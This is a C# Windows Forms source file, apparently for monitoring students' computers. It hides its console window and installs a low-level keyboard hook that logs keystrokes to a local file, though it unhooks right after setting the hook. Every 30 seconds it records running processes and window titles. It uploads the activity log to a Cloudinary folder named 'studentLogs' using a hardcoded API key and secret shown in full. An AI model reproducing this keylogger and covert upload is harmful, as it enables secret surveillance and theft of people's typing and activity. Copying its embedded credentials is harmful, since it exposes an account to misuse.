using CloudinaryDotNet;
using CloudinaryDotNet.Actions;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Admin_SSDA
{
    public partial class Form2 : Form
    {
       

      public static Cloudinary cloudinary;
        public Form2()
        {
            InitializeComponent();
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\DOC.txt"))

            {
                File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + @"\DOC.txt");
            }
            if (File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt"))
            {
                File.Delete(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt");
            }


            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt"))
            {
                File.WriteAllText(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", "");
            }

            StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);
            sw.Write("[ " + GetTimeStamp() + " ]");
            sw.Close();
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
            InitTimer();
            
        }

        private void DetectOpenBrowser()
        {
            var detector = new Browsers();
            var data = detector.GetBrowserURL("firefox");
            Console.WriteLine("List:   {0}", data);

            Process[] processlist = Process.GetProcesses();
            StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\DOC.txt", true);
            if (!File.Exists(Path.GetDirectoryName(Application.ExecutablePath) + @"\DOC.txt"))
            {
                File.WriteAllText(Path.GetDirectoryName(Application.ExecutablePath) + @"\DOC.txt", GlobalConfig.UserID + " " + GlobalConfig.RollNumber);
            }
            else
            {
                sw.WriteLine(GlobalConfig.UserID + " " + GlobalConfig.RollNumber
                  );
            }
            foreach (Process process in processlist)
            {
                if (!String.IsNullOrEmpty(process.MainWindowTitle))
                {
                    Console.WriteLine("Process: {0}", process.ProcessName);
                    Console.WriteLine("  ID   : {0}", process.Id);
                    Console.WriteLine("  Title: {0} \n", process.MainWindowTitle);

                    if (process.ProcessName != null)
                    {
                        ListViewItem item = new ListViewItem(new string[] { process.ProcessName.ToString() });
                        lstDisplayHardware.Items.Add(item);
                        GetBrowserTabTime(process, sw, "Online");

                    }

                }

            }
            sw.Close();
        }
       
        public bool IsRunning(Process process)
        {
            try { Process.GetProcessById(process.Id); }
            catch (InvalidOperationException) { return false; }
            catch (ArgumentException) { return false; }
            return true;
        }

        public void GetBrowserTabTime(Process proc, StreamWriter sw, String mode)
        {
            TimeSpan runtime;

            try
            {
                runtime = DateTime.Now - proc.StartTime;
                
                sw.WriteLine("Process : " +
                   proc.ProcessName +
                   " , Title: " +
                   proc.MainWindowTitle +
                   " , Process Time : "
                   + "{0} Days, {1} Hours, {2} Minutes, {3} Seconds and {4} Milliseconds",
                    runtime.Days,
                    runtime.Hours,
                    runtime.Minutes,
                    runtime.Seconds,
                    runtime.Milliseconds  
                   ,
                   runtime);
            }
            catch (Win32Exception ex)
            {
                if (ex.NativeErrorCode == 5)
                    return;
                //  throw;
            }


        }
        private Timer timer1;
        public void InitTimer()
        {
            DetectOpenBrowser();
            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 30000; // in miliseconds
            timer1.Start();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            DetectOpenBrowser();
        }
        /*
        public DateTime GetProcessStartTime(string processName)
        {
            Process[] p = Process.GetProcessesByName(processName);
            if (p.Length <= 0) throw new Exception("Process not found!");
            return p[0].StartTime;
        }*/

        private void action_btn_get_Click(object sender, EventArgs e)
        {
            //DetectOpenBrowser();
            string uninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(uninstallKey))
            {
                foreach (string skName in rk.GetSubKeyNames())
                {
                    using (RegistryKey sk = rk.OpenSubKey(skName))
                    {
                        try
                        {
                            var displayName = sk.GetValue("DisplayName");
                            var size = sk.GetValue("EstimatedSize");

                            ListViewItem item;
                            if (displayName != null)
                            {
                                if (size != null)
                                    item = new ListViewItem(new string[] {displayName.ToString(),
                                                       size.ToString()});
                                else
                                    item = new ListViewItem(new string[] { displayName.ToString() });
                                lstDisplayHardware.Items.Add(item);
                            }
                        }
                        catch (Exception ex)
                        {
                            ex.ToString();
                        }
                    }
                }
                // label1.Text += " (" + lstDisplayHardware.Items.Count.ToString() + ")";
            }
        }
        /// <summary>
        /// ////////////
        /// </summary>
        /// <returns></returns>
        public static string GetTimeStamp()
        {
            return DateTime.Now.ToString();
        }
        private const int WH_KEYBOARD_LL = 13;

        private const int WM_KEYDOWN = 0x0100;

        private static LowLevelKeyboardProc _proc = HookCallback;

        private static IntPtr _hookID = IntPtr.Zero;

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())

            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                StreamWriter sw = new StreamWriter(Path.GetDirectoryName(Application.ExecutablePath) + @"\log.txt", true);

                string key = Convert.ToString((Keys)vkCode);
                if (verifyKey(vkCode))
                {
                    sw.Write(key);
                }
                else if (vkCode == 13)
                {
                    sw.Write(" " + key + " ");
                }
                else
                {
                    sw.Write(" " + key + " ");
                }

                sw.Close();
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        private static bool verifyKey(int code)
        {

            if (code == 48
                || code == 49 || code == 50 || code == 51
                || code == 52 || code == 53 || code == 54 || code == 55 || code == 56 || code == 57 || code == 65
                || code == 66 || code == 67 || code == 68 || code == 69 || code == 70 || code == 71 || code == 72
                || code == 73 || code == 74 || code == 75 || code == 76 || code == 77 || code == 78 || code == 79
                || code == 80 || code == 81 || code == 82 || code == 83 || code == 84 || code == 85 || code == 86
                || code == 87 || code == 88 || code == 89 || code == 90 || code == 96 || code == 97 || code == 98
                || code == 99 || code == 100 || code == 101
                || code == 102 || code == 103 || code == 104 || code == 105) return true;
            else return false;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        const int SW_HIDE = 0;

        private void button1_Click(object sender, EventArgs e)
        {
            string CLOUD_NAME = "dhmzxoqi4";
            string API_KEY = "124261996441551";
            string API_SECRET = "TBtx4XrlE29CWvhRoJ3whJ0kNyc";
            Account account = new Account(CLOUD_NAME, API_KEY, API_SECRET);
            cloudinary = new Cloudinary(account);
            var path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
            Console.WriteLine(path);
            uploadFile(path+"\\DOC.txt", "faatima", "Doc");
            
        }
        public static void uploadFile(string path, string subfolder, string public_id)
        {
            try {
                var uploadParams = new RawUploadParams()
                {
                    File = new FileDescription(path),
                    PublicId = public_id,
                    Folder = "studentLogs/"+  subfolder
                };
                var uploadResult = cloudinary.Upload(uploadParams);
                Console.WriteLine(uploadResult.Uri);
            } catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }

          
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
